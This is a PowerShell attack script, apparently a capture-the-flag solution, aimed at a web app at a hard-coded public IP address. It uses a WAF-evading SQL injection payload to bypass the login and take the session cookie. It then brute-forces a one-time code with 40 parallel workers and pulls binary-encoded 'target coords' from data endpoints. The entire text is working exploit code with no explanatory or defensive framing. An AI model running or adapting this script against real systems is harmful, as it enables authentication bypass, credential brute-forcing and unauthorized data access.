$BASE = "http://52.66.177.113"

# --- Stage 1: WAF-bypass SQLi login ---
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-WebRequest "$BASE/login.php" -WebSession $session -UseBasicParsing | Out-Null

$rawUser = "zzz')||1#"
$encUser = [Uri]::EscapeDataString($rawUser)
$loginBody = "username=$encUser&password=x&login=1"
try {
    $r = Invoke-WebRequest "$BASE/login.php" -Method POST -Body $loginBody -ContentType "application/x-www-form-urlencoded" -WebSession $session -UseBasicParsing -MaximumRedirection 0 -ErrorAction Stop
} catch {
    $r = $_.Exception.Response
}
$SID = ($session.Cookies.GetCookies($BASE) | Where-Object { $_.Name -eq "PHPSESSID" }).Value
Write-Host "Stage 1: logged in. PHPSESSID=$SID"

# --- Stage 2: build OTP ---
$d = Invoke-WebRequest "$BASE/dashboard.php" -WebSession $session -UseBasicParsing
$term = $d.Headers["X-Reactor-Terminal"]
$radix = $d.Headers["X-Reactor-Radix"]
Write-Host "X-Reactor-Terminal=$term  X-Reactor-Radix=$radix"
$pos6 = [Convert]::ToInt32("$term", [int]"$radix")
$pos1 = 4  # sector IV from robots.txt
Write-Host "pos1=$pos1  pos6=$pos6"

# Brute middle 4 digits in parallel
$pool = [RunspaceFactory]::CreateRunspacePool(1, 40)
$pool.Open()
$jobs = New-Object System.Collections.Generic.List[object]
$sb = [scriptblock]::Create(@"
param(`$mid, `$SID, `$pos1, `$pos6, `$BASE)
`$code = "`$pos1" + `$mid + "`$pos6"
try {
    `$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    `$c = New-Object System.Net.Cookie("PHPSESSID", `$SID, "/", "52.66.177.113")
    `$s.Cookies.Add(`$c)
    `$r = Invoke-WebRequest "`$BASE/otp.php" -Method POST -Body "code=`$code" -ContentType "application/x-www-form-urlencoded" -WebSession `$s -UseBasicParsing -MaximumRedirection 0 -ErrorAction Stop
    if (`$r.StatusCode -eq 302) { return `$code }
} catch {
    if (`$_.Exception.Response.StatusCode.value__ -eq 302) { return `$code }
}
return `$null
"@)

foreach ($m in 0..9999) {
    $mid = $m.ToString("0000")
    $ps = [PowerShell]::Create()
    $ps.RunspacePool = $pool
    $null = $ps.AddScript($sb).AddArgument($mid).AddArgument($SID).AddArgument($pos1).AddArgument($pos6).AddArgument($BASE)
    $jobs.Add([PSCustomObject]@{ PS=$ps; H=$ps.BeginInvoke() })
}

$otp = $null
foreach ($j in $jobs) {
    $res = $j.PS.EndInvoke($j.H)
    if ($res) { $otp = $res; break }
    $j.PS.Dispose()
}
$pool.Close()
Write-Host "Stage 2: OTP found = $otp"

# Unlock main session
Invoke-WebRequest "$BASE/otp.php" -Method POST -Body "code=$otp" -ContentType "application/x-www-form-urlencoded" -WebSession $session -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue | Out-Null
Invoke-WebRequest "$BASE/nuclear.php" -WebSession $session -UseBasicParsing | Out-Null

# --- Stage 3: read + decode target nodes ---
Write-Host "`nStage 3: reading nodes..."
$coords = @()
foreach ($i in 1..8) {
    $t = (Invoke-WebRequest "$BASE/data.php?id=electron$i" -WebSession $session -UseBasicParsing -Headers @{ "X-Requested-With" = "reactor-console" }).Content.Trim()
    Write-Host "electron${i}: $t"
    if ($t -match '^[01 ]+$') {
        $decoded = -join (($t -split ' ') | ForEach-Object { [char][Convert]::ToInt32($_, 2) })
        $coords += $decoded
    }
}
Write-Host "`nTarget coords: $($coords -join ' ')"
